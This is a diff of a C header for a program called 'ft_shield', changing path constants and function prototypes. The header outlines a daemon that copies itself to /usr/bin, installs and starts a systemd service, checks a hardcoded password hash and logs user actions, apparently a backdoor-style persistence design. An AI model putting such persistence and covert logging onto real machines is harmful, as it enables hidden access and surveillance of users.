@@ -19,7 +19,7 @@
 #define MAX_CLIENTS 3
 #define AUTH_PASSWORD_HASH "8fb9f8fd"
 #define SECRET_KEY 54
-#define SOURCE_FILE "ft_shield"
+#define SOURCE_FILE "src/ft_shield"
 #define DEST_FILE "/usr/bin/ft_shield"
 #define SERVICE_NAME "ft_shield.service"
 #define DISK_STATS_OUTPUT "/home/yoyo/logs.txt"
@@ -37,15 +37,7 @@ void create_daemon();
 void copy_binary_file(const char *sourcePath, const char *destinationPath);
 void create_systemd_service(const char* service_name, const char* binary_path);
 void enable_and_start_service(const char* service_name);
-int tcp_server(int server_fd,
-    int new_socket,
-    int client_socket[MAX_CLIENTS],
-    int max_sd,
-    int socket_id,
-    int activity,
-    struct sockaddr_in addr,
-    int addrlen,
-    fd_set readfds);
+void log_user_action(const char *command);
 #endif
 
 
